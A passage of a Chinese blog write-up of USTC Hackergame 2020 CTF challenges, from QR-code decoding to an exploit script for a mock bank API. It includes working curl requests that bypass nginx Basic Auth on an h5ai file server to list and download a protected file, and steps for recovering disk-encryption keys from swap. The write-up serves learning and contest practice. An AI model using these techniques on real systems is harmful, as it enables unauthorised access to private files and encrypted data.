文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 